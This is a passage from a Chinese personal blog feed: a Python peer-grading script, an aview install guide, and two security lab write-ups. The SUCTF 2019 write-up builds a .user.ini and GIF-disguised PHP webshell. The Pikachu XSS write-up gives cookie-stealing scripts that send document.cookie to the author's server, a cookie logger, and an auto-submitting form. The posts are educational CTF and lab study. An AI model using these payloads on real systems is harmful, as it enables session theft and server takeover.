round(<span class="number">30</span>*(times / the_number_of_times))</span><br><span class="line">    print(<span class="string">'['</span>+<span class="string">'*'</span>*per+<span class="string">' '</span>*(<span class="number">30</span>-per)+<span class="string">']'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> times</span><br><span class="line">    <span class="comment"># 目标文件初始化</span></span><br><span class="line">    document_result = Document()</span><br><span class="line">    document_result.add_heading(<span class="string">'学生互评分数计算结果'</span>)</span><br><span class="line">    table = document_result.add_table(rows=the_number_of_student+<span class="number">1</span>, cols=the_number_of_item+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 表格表头初始化</span></span><br><span class="line">    first_table = Document(<span class="string">'1.docx'</span>).tables[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_item+<span class="number">1</span>):</span><br><span class="line">        table.rows[<span class="number">0</span>].cells[n].text = first_table.rows[<span class="number">2</span>].cells[n].text</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_student+<span class="number">1</span>):</span><br><span class="line">        table.rows[n].cells[<span class="number">0</span>].text = first_table.rows[<span class="number">3</span>+n].cells[<span class="number">0</span>].text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读文件, 取数据</span></span><br><span class="line">    data = [[[<span class="number">0</span>]*(the_number_of_item+<span class="number">1</span>)]*(the_number_of_student+<span class="number">1</span>)]*(the_number_of_student+<span class="number">1</span>)</span><br><span class="line">    arr = np.array(data)</span><br><span class="line">    <span class="keyword">for</span> index_of_file <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_files+<span class="number">1</span>):</span><br><span class="line">        source = Document(str(index_of_file)+<span class="string">'.docx'</span>).tables[<span class="number">0</span>]</span><br><span class="line">        show_progress()</span><br><span class="line">        <span class="keyword">for</span> index_of_rows <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_student+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> index_of_cells <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_item+<span class="number">1</span>):</span><br><span class="line">                times += <span class="number">2</span></span><br><span class="line">                <span class="comment"># 有些憨憨把空空着不写, 得判断下</span></span><br><span class="line">                <span class="keyword">if</span> len(source.rows[index_of_rows+<span class="number">3</span>].cells[index_of_cells].text) &gt; <span class="number">0</span>: </span><br><span class="line">                    arr[index_of_file][index_of_rows][index_of_cells] = float(source.rows[index_of_rows+<span class="number">3</span>].cells[index_of_cells].text)</span><br><span class="line">                <span class="keyword">else</span> :</span><br><span class="line">                    arr[index_of_file][index_of_rows][index_of_cells] = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 算结果</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_student+<span class="number">1</span>):</span><br><span class="line">        show_progress()</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_item+<span class="number">1</span>):</span><br><span class="line">            temp = []</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,the_number_of_files+<span class="number">1</span>):</span><br><span class="line">                times += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> arr[c][a][b] &gt; <span class="number">0</span>:</span><br><span class="line">                    temp.append(arr[c][a][b])</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 删除最大值和最小值</span></span><br><span class="line">            <span class="keyword">del</span> temp[temp.index(max(temp))]</span><br><span class="line">            <span class="keyword">del</span> temp[temp.index(min(temp))]</span><br><span class="line">            table.rows[a].cells[b].text = str(round(sum(temp)/len(temp),<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存成目标文件</span></span><br><span class="line">    document_result.save(<span class="string">'result.docx'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2><p>一时兴起的产物.</p>
<p>虽然代码写得很烂, 算法也朴实无华…</p>
<p>但确实帮到了室友, 我也学到了东西, 这让我感觉很棒. </p>
<p>也是第一次用python处理word, 感觉很有潜力, 未来可能还会深入的学习使用, 特别的来记录下. </p>
<h2 id="2019-9-4-更新"><a href="#2019-9-4-更新" class="headerlink" title="2019/9/4 更新"></a>2019/9/4 更新</h2><ul>
<li>改善进度条的效果</li>
<li>表头初始化优化, 大大缩短代码</li>
<li>加入了更多注释</li>
<li>修改了某些细节</li>
</ul>
<p><strong>或者点击下方为我打赏, 鼓励我写出更优质的脚本吧(手动滑稽)</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
            <tag> word </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CheckIn]]></title>
      <url>/2019/08/19/CheckIn/</url>
      <content type="html"><![CDATA[<p>来源: SUCTF 2019</p>
<a id="more"></a>
<h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>感谢<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd学长</a>和南开的<a href>QHX学长</a>, 在他们的指导下菜逼我终于搞出了这道题.</p>
<h2 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码:"></a>题目代码:</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Upload Labs<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"fileUpload"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"upload"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// error_reporting(0);</span><br><span class="line">$userdir = "uploads/" . md5($_SERVER["REMOTE_ADDR"]);</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . "/index.php", "");</span><br><span class="line">if (isset($_POST["upload"])) &#123;</span><br><span class="line">    $tmp_name = $_FILES["fileUpload"]["tmp_name"];</span><br><span class="line">    $name = $_FILES["fileUpload"]["name"];</span><br><span class="line">    if (!$tmp_name) &#123;</span><br><span class="line">        die("filesize too big!");</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;</span><br><span class="line">        die("filename cannot be empty!");</span><br><span class="line">    &#125;</span><br><span class="line">    $extension = substr($name, strrpos($name, ".") + 1);</span><br><span class="line">    if (preg_match("/ph|htaccess/i", $extension)) &#123;</span><br><span class="line">        die("illegal suffix!");</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), "&lt;?") !== FALSE) &#123;</span><br><span class="line">        die("&amp;lt;? in contents!");</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type = exif_imagetype($tmp_name);</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die("exif_imagetype:not image!");</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path = $userdir . "/" . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo "Your dir " . $userdir. ' &lt;br&gt;';</span><br><span class="line">    echo 'Your files : &lt;br&gt;';</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="题目特点"><a href="#题目特点" class="headerlink" title="题目特点:"></a>题目特点:</h2><ul>
<li>一看就是文件上传漏洞</li>
<li>会给出上传文件的目录</li>
<li>上传文件所在得目录下会自带个index.php, 这是一个关键的突破口.</li>
<li>会给出上传目录的<code>ls</code>的 var_dump .</li>
</ul>
<h2 id="题目难点"><a href="#题目难点" class="headerlink" title="题目难点:"></a>题目难点:</h2><ul>
<li>文件后缀名检测, 这让我们没法直接上传<code>.php</code>文件.</li>
<li>文件内容(首部)检测, 只能是图片格式.</li>
<li>检测<code>&lt;?</code>, 一句话木马不能用最常用的写法了.</li>
</ul>
<h2 id="题目解法-可能不唯一"><a href="#题目解法-可能不唯一" class="headerlink" title="题目解法(可能不唯一):"></a>题目解法(可能不唯一):</h2><p>因为我们没法上传php文件, 所以一定要让我们的马在 index.php 里运行.<br>这就会用到文件包含漏洞.</p>
<p>和我之前见到的<code>include &quot;xxx.xxx&quot;</code>不同, 这里需要用到文件<code>.user.ini</code>和<code>auto_prepend_file=filename.xxx</code>.</p>
<p>在这道题的配置中, 如果web目录下有上述的配置文件, 就可以在运行index.php时先解析<code>filename.xxx</code>文件. 而且可以是任何后缀的文件.</p>
<p>虽然不能写<code>&lt;?php   php_code     ?&gt;</code>这种形式, 但是可以用<code>&lt;script language=&quot;php&quot;&gt;php_code&lt;/sript&gt;</code>代替.</p>
<p>对于图片内容的检测, 如果我们以gif文件作为payload, 只需要加上<code>GIF89A</code>即可绕过. (仅对于本题中的<code>exif_imagetype()</code>函数及类似的检测方式.)</p>
<p>几个常见的文件头<br>|文件类型|文件头|文件尾|<br>|:—|:—|:—|<br>|PNG|89504E47|AE426082|<br>|GIF|47494638|003B|<br>|JPEG|FFD8FF|FFD9|<br>|ZIP|504B0304|504B|<br>|PDF|255044462D|—-|</p>
<p><a href="http://www.cnblogs.com/lwy-kitty/p/3928317.html" target="_blank" rel="noopener">还有一些不是很常用的</a></p>
<h2 id="总之"><a href="#总之" class="headerlink" title="总之"></a>总之</h2><p>.user.ini</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line">auto_prepend_file=home.gif</span><br></pre></td></tr></table></figure>

<p>home.gif</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span>eval($_POST['cmd']);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传这两个文件后, 在访问同一目录下的 index.php , 我们的代码就被执行了.</p>
<p>flag: <code>SUCTF{U5er_1n1_01d_TR1ck}</code></p>
<p>完.</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 文件包含漏洞 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一个有意思的小工具——aview]]></title>
      <url>/2019/08/17/asciiview/</url>
      <content type="html"><![CDATA[<p>给你康个好van的~</p>
<a id="more"></a>
<h1 id="asciiview"><a href="#asciiview" class="headerlink" title="asciiview"></a><code>asciiview</code></h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一阵子发现了一个linux系统下的很好玩的小工具, 也就是 aview, 它可以把图片转化成字符画的形式, 并且可以对图片的一些属性, 比如亮度, 对比度进行调节和导出成各种文件格式. 效果我自认为供我们自娱自乐还是不错的.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/效果.jpg" alt title class>
                <p></p>
            </figure>
<p>这个我也没太调好, 实际效果要好一些的.</p>
<h2 id="安装-aview"><a href="#安装-aview" class="headerlink" title="安装 aview"></a>安装 aview</h2><p>安装 asciiview 本身并不麻烦, 一般来说使用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aview</span><br></pre></td></tr></table></figure>

<p>就可以一键安装了.<br>但如果你安装时显示”无法定位软件包”(或”unable to locate package aview”), 那应该是下载源的问题.<br>解决办法:</p>
<ol start="0">
<li><p>备份(选做)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cd /etc/apt</span><br><span class="line">sudo cp sources.list sources.list.bak</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改 source.list<code></code>sudo vi /etc/apt/source.list`<br>然后加上这两行代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free </span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>保存.</p>
<ol start="2">
<li><p>更新 apt-get</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>重新尝试下载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install aview</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>通常这样就可以安装好了.</p>
<p>但是 aview 有个缺点就是对图片格式支持的比较少, 我们常用的大多数图片是没法被 aview 直接识别的.<br>所以我们还需要另外的一款工具 ImageMagick`.<br>这个工具安装起来有点麻烦, 如果你的 linux 使用了yum, 你可以尝试直接下载安装. 但如果是用 apt-get, 八成是没法直接安装的.<br>我们要先下载它的<a href="http://www.imagemagick.org/download/" target="_blank" rel="noopener">源码</a><br>解压后放在合适的目录下, 然后在解压后的目录下运行configure</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>

<p>运行结束后会有个检测报告, 如果缺乏依赖的软件或者库会报告给你, 我没有遇到就不赘述了. <del>主要是我也看不懂</del><br>下面需要使用make进行编译安装.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

<p>到这里安装就结束了. 使用命令<code>convert -version</code>查看是否成功.<br>ImageMagick 的使用和复杂, 在这里不介绍了.<br>其实如果没有安装成功也没有关系, 网上也有很多在线图片格式转换的网站, 也很省事.<br><a href="https://convertio.co/zh/pgm-converter/" target="_blank" rel="noopener">在线pgm转换器</a></p>
<h2 id="使用-aview"><a href="#使用-aview" class="headerlink" title="使用 aview"></a>使用 aview</h2><p>使用方法比较简单</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aview filename.pgm</span><br></pre></td></tr></table></figure>

<p>可以看到预览界面.<br>除此之外, 还有这些功能:</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/aview.png" alt title class>
                <p></p>
            </figure>
<p>可以用它们来调整图像效果, 或者导出为<code>txt, html</code> 等格式.</p>
<p>完.<br><del>其实我只是想让你们看下我的新封面而已.</del></p>
]]></content>
      
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> misc </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Pikachu 漏洞练习平台]]></title>
      <url>/2019/08/14/xss-csrf%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p><a href="https://bbs.pediy.com/thread-246122.htm" target="_blank" rel="noopener">了解一下?</a></p>
<a id="more"></a>
<h1 id="Pikachu-漏洞练习平台"><a href="#Pikachu-漏洞练习平台" class="headerlink" title="Pikachu 漏洞练习平台"></a>Pikachu 漏洞练习平台</h1><p>下面的演示中, 攻击者与被攻击者使用同一台服务器, ip地址使用<code>ipadd</code>代替</p>
<h2 id="xss-Cross-Site-Scripting"><a href="#xss-Cross-Site-Scripting" class="headerlink" title="xss(Cross-Site Scripting)"></a>xss(Cross-Site Scripting)</h2><h3 id="什么是"><a href="#什么是" class="headerlink" title="什么是"></a>什么是</h3><p>高深莫测版:</p>
<ul>
<li>xss: 跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。</li>
<li>csrf: 跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</li>
</ul>
<p>通俗易懂版:</p>
<ul>
<li>xss: 通过客户端脚本语言（最常见如：JavaScript），在网页上注入恶意脚本，且代码内容请求外部服务器。</li>
<li>csrf: 又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。</li>
</ul>
<h3 id="反射性xss-GET"><a href="#反射性xss-GET" class="headerlink" title="反射性xss(GET)"></a>反射性xss(GET)</h3><p>首先尝试下输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 发现有字数限制, 然而通过观察或者抓包可以发现参数是通过GET上传的, 那么把刚才的代码赋值给参数message后, 成功的弹窗.<br>然后在服务器写入下面两个文件</p>
<ul>
<li><code>get_cookie.js</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">"http://ipadd/myxss/index.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这个js文件可以在页面中追加一个图片资源, 并且指向我们自己的一台服务器的某个文件(即下面的<code>index.php</code>)并向其发送参数. </p>
<ul>
<li><code>index.php</code><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">$cookie = $_GET[<span class="string">'cookie'</span>];</span></span><br><span class="line"><span class="php">$time = time();</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$ip = $_SERVER[<span class="string">"REMOTE_ADDR"</span>];</span></span><br><span class="line"><span class="php">$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span></span><br><span class="line"><span class="php">$txt = date(<span class="string">"Y/m/d-h:i:s"</span>).<span class="string">" ip="</span>.$ip.<span class="string">"  cookie="</span>.$cookie.<span class="string">" referer="</span>.$referer.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $txt;</span></span><br><span class="line"><span class="php">file_put_contents(<span class="string">"log.txt"</span>,$txt,FILE_APPEND);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>接收上面传来的参数, 并保存于文件<code>log.txt</code>中<br>这些准备工作完成后, 构造下面的payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/xss/xss_reflected_get.php?message=&lt;script src=http://ipadd/myjs/get_cookie.js /&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>在浏览器访问后, 再查看<code>log.txt</code>中已经有了访问该链接的用户的cookie.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/get_cookie.png" alt title class>
                <p></p>
            </figure>
<h3 id="反射性xss-POST"><a href="#反射性xss-POST" class="headerlink" title="反射性xss(POST)"></a>反射性xss(POST)</h3><p>这题让我有些疑惑, 题目最开始是个登陆框, 这里应该是大概要用sql注入或者其它漏洞登陆后才有后续吧? 还好点一下提示后告诉了我们密码, 先登录再说.<br>登录后, 就和上题一样了, 唯一的区别是这次是用POST传参数, 我们抓下包, 修改其中 message 成我们的恶意代码. 后面的一切顺利.</p>
<p>但是这样还远远不够, 因为仅仅获取了我们自己的cookie.<br>试想下, 如何才能获取其它用户的cookie呢?</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/mind.png" alt title class>
                <p></p>
            </figure>

<p>如果使用题目提供的admin账号登录后, 我们发现从登录页面跳转到了真的题目页<code>http://ipadd/pikachu/vul/xss/xsspost/xss_reflected_post.php</code>.<br>如果我们登录后直接访问这个页面发现的确不需要使用账号密码. 所以访问这个页面时一定使用了cookie. </p>
<p>我需要他(受害者)能够提交一份包含着我的代码的表单. 这里就需要伪造一个自动提交表单的页面.<br>可以先看下我们正常提交时的http数据包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /pikachu/vul/xss/xsspost/xss_reflected_post.php HTTP/1.1</span><br><span class="line">Referer: http://ipadd/myxss/xss_post.php</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 94</span><br><span class="line">Host: ipadd</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=172i5in739ti4qqb1f2c752627</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">message=%3Cscript+src%3Dhttp%3A%2F%2Fipadd%3A999%2Fmyjs%2Fget_cookie.js&amp;submit=submit</span><br></pre></td></tr></table></figure>

<p>我们的表单需要两个参数<code>message</code>和<code>submit</code>.<br>它们的值先预先写进网页中, 在使用js脚本自动提交.<br><code>xss_post.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"http://ipadd/pikachu/vul/xss/xsspost/xss_reflected_post.php"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"xssr_in"</span> <span class="attr">type</span>= <span class="string">"text"</span> <span class="attr">maxlength</span>=<span class="string">"20"</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"&lt;script src=http://ipadd/myjs/get_cookie.js /&gt;"</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"postsubmit"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">                <span class="built_in">document</span>.getElementById(<span class="string">"postsubmit"</span>).click();</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以现在只需要让受害者访问<code>http://ipadd/myxss/xss_post.php</code>这个页面, 我就能直接获得他在这个页面的cookie, 简直不要太爽!(前提是该用户必须已经登录过)</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/post_cookie.png" alt title class>
                <p></p>
            </figure>

<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>感觉存储型比上面的反射型还要简单很多, 留言框输入:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://ipadd/myjs/get_cookie.js</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p>完事~</p>
<h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p><a href="https://www.w3school.com.cn/htmldom/dom_intro.asp" target="_blank" rel="noopener">什么是 DOM?</a></p>
<p>再放一张w3school的图</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/ct_htmltree.gif" alt title class>
                <p></p>
            </figure>

<p>总之, DOM应该就是包括<code>html</code>在内的结构化文档的一个树状模型. 不过<code>html</code>文档符合树状结构我倒是在大概一个月前用<code>python selenium</code>写那个QQ空间自动点赞的程序时就早有体会了. <code>DOM</code>与<code>xpath</code>给我的印象还是很相似的, 不知两者严格来讲到底是什么关系.</p>
